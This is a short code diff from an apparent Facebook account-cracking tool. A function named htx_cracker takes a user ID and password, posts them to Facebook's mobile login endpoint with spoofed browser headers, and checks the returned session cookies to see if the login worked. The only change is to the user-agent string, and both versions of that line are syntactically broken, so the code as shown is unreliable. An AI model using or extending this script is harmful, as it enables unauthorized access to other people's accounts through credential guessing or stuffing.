@@ -182,7 +182,7 @@ def htx_cracker(uid,pss):
             'sec-fetch-site': 'cross-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'pro,}
+            'user-agent': 'ua,}
 
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=pron_star).text
             log_cookies=session.cookies.get_dict().keys()
